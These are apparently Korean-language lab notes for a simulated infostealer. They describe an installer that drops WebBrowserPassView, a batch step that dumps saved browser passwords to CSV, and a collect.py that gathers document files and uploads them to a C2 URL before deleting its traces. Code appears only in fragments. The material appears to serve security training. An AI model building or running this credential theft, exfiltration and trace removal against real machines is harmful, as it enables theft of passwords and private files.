# Infostealer

## WebBrowserPassView.exe

### installer.iss

```iss
#define SpecFinder "WebBrowserPassView.exe"

Source: "{#SpecFinder}"; \
DestDir: "C:\Tools"; \
Flags: ignoreversion
```

### 1. SETTING

- **TOOL**: `C:\Tools\WebBrowserPassView.exe`
- **OUTPUT**: `C:\Users\kisec\AppData\Local\Temp\LabOutput\browser_passwords.csv`

### 2. WebBrowserPassView

사용자 프로필에 저장된 웹사이트 주소, 사용자 ID, 비밀번호 등의 로그인 정보를 조회할 수 있음.

### post-install.bat

- `TOOL`: `C:\Tools\WebBrowserPassView.exe`
- `OUTPUT`: `C:\Users\kisec\AppData\Local\Temp\LabOutput\browser_passwords.csv`
- 도구가 존재하지 않을 경우 오류 출력
- `C:\Users\kisec\AppData\Local\Temp\LabOutput` 디렉터리가 존재하지 않을 경우 생성
- WebBrowserPassView를 이용하여 CSV 생성
- CSV 생성 여부에 따라 성공 또는 오류 메시지 출력

#### 1. 비밀번호 추출 (`/scomma`)

PC에 저장된 모든 웹 브라우저(Chrome, Edge, Firefox 등)의 웹사이트 주소, ID, 비밀번호 데이터를 추출하여 지정한 CSV 파일로 저장.

---

## collect.exe

### collect.py

사용 모듈:

```python
from pathlib import Path
from urllib.request import Request, urlopen
from urllib.parse import quote
import shutil
```

설정값:

```text
C2_URL = http://10.0.0.10:8080/upload
DATA_DIR = C:\Users

TARGET_EXTENSIONS
- .csv
- .hwp
- .hwpx
- .txt
- .xls
```

### 1. 타깃 문서 검색 (`rglob`)

디렉터리를 재귀적으로 탐색하여 특정 문서 확장자를 가진 파일만 걸러냄.

대상 확장자:

```text
.csv
.hwp
.hwpx
.txt
.xls
```

### 2. 파일 탈취 및 C2 전송 (`urllib.request`)

- 파일을 바이너리 형태(`read_bytes()`)로 읽어옴.
- C2 서버에서 원본 경로 구조를 유추할 수 있도록 파일의 상대 경로(`X-Relative-Path`)를 URL 인코딩하여 HTTP 헤더에 담음.
- POST 요청을 통해 `Content-Type: application/octet-stream` 바이너리 스트림으로 C2 서버에 파일을 업로드함.

```text
http://10.0.0.10:8080/upload
```

### 3. 흔적 제거 및 후처리 (`shutil.rmtree`)

파일 탈취 작업이 모두 끝난 후 다음 디렉터리와 그 내부 콘텐츠를 완전히 삭제함.

```text
C:\Users\kisec\AppData\Local\Temp\LabOutput
```
